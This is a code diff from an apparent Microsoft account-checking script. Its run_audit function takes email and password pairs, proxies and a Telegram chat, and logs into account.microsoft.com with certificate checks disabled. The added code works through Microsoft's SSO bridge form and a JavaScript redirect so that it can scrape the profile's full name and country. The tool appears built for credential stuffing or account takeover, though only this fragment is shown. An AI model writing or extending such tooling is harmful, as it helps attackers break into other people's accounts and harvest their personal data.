@@ -457,11 +457,30 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 if country and '-' in country:
                     country = country.split('-')[-1].upper()
                     
-        if keyword != "jerry7822":
             try:
                 profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
                 if profile_html_res.status_code == 200:
                     html_text = profile_html_res.text
+                    
+                    # --- Resolver SSO Bridge de Microsoft (JS POST) ---
+                    if "<form" in html_text and 'name="t"' in html_text:
+                        action_m = re.search(r'action="([^"]+)"', html_text, re.IGNORECASE)
+                        t_m = re.search(r'name="t"[^>]*value="([^"]+)"', html_text, re.IGNORECASE)
+                        if action_m and t_m:
+                            action_url = action_m.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
+                            bridge_data = {"t": t_m.group(1).replace("&quot;", '"')}
+                            p_m = re.search(r'name="p"[^>]*value="([^"]+)"', html_text, re.IGNORECASE)
+                            if p_m: bridge_data["p"] = p_m.group(1).replace("&quot;", '"')
+                            
+                            profile_html_res = session.post(action_url, data=bridge_data, verify=False, timeout=15)
+                            html_text = profile_html_res.text
+                            # Segunda redireccion JS comun en Microsoft
+                            if "window.location.replace" in html_text:
+                                redir_m = re.search(r'window\.location\.replace\((["\'])(.*?)\1\)', html_text)
+                                if redir_m:
+                                    profile_html_res = session.get(redir_m.group(2), verify=False, timeout=15)
+                                    html_text = profile_html_res.text
+                    # --------------------------------------------------
                     
                     if name == "N/A" or not name:
                         m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
